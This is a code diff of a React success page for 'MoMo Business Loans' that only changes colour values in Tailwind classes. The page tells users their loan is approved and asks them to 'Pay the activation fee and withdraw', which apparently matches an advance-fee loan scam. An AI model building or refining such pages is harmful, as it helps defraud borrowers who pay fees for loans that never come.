@@ -18,11 +18,11 @@ export default function SuccessPage() {
 
   return (
     <PageLoader>
-      <div className="min-h-screen bg-[hsl(220,50%,12%)] text-white flex flex-col relative overflow-x-hidden">
+      <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col relative overflow-x-hidden">
         <Confetti />
 
         {/* Top Header */}
-        <header className="bg-[#ffcc00] text-[hsl(220,50%,12%)] py-3 px-4 shadow-md sticky top-0 z-40">
+        <header className="bg-[#ffcc00] text-[hsl(198,100%,22%)] py-3 px-4 shadow-md sticky top-0 z-40">
           <div className="container mx-auto max-w-4xl flex items-center justify-between">
             <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
               <Logo size="sm" />
@@ -30,7 +30,7 @@ export default function SuccessPage() {
                 MoMo <span className="font-normal opacity-90">Business Loans</span>
               </span>
             </div>
-            <span className="text-xs font-bold bg-[hsl(220,50%,12%)]/10 px-3 py-1 rounded-full text-[hsl(220,50%,12%)]">
+            <span className="text-xs font-bold bg-[hsl(198,100%,22%)]/10 px-3 py-1 rounded-full text-[hsl(198,100%,22%)]">
               Application Approved
             </span>
           </div>
@@ -38,12 +38,12 @@ export default function SuccessPage() {
 
         {/* Main Success Container */}
         <main className="flex-1 flex flex-col items-center justify-center px-4 py-8 sm:py-12">
-          <div className="bg-white rounded-3xl p-6 sm:p-10 text-center max-w-md w-full shadow-2xl text-[hsl(220,50%,12%)] border border-gray-100 relative z-10">
+          <div className="bg-white rounded-3xl p-6 sm:p-10 text-center max-w-md w-full shadow-2xl text-[hsl(198,100%,22%)] border border-gray-100 relative z-10">
             <div className="w-20 h-20 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-4 border-2 border-green-200">
               <CheckCircle2 className="w-12 h-12 text-green-500" />
             </div>
 
-            <h2 className="text-2xl sm:text-3xl font-black mb-2 tracking-tight text-[hsl(220,50%,12%)]">
+            <h2 className="text-2xl sm:text-3xl font-black mb-2 tracking-tight text-[hsl(198,100%,22%)]">
               🎉 Congratulations!
             </h2>
             <p className="text-gray-600 text-sm leading-relaxed mb-6 font-medium">
@@ -86,7 +86,7 @@ export default function SuccessPage() {
               <button
                 id="success-pay-withdraw-btn"
                 onClick={() => navigate('/payment')}
-                className="w-full flex items-center justify-center gap-2 py-4 rounded-2xl bg-[#ffcc00] text-[hsl(220,50%,12%)] font-black text-base transition hover:bg-[#ffcc00]/90 shadow-md cursor-pointer group"
+                className="w-full flex items-center justify-center gap-2 py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-black text-base transition hover:bg-[#ffcc00]/90 shadow-md cursor-pointer group"
               >
                 <span>Pay the activation fee and withdraw</span>
                 <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
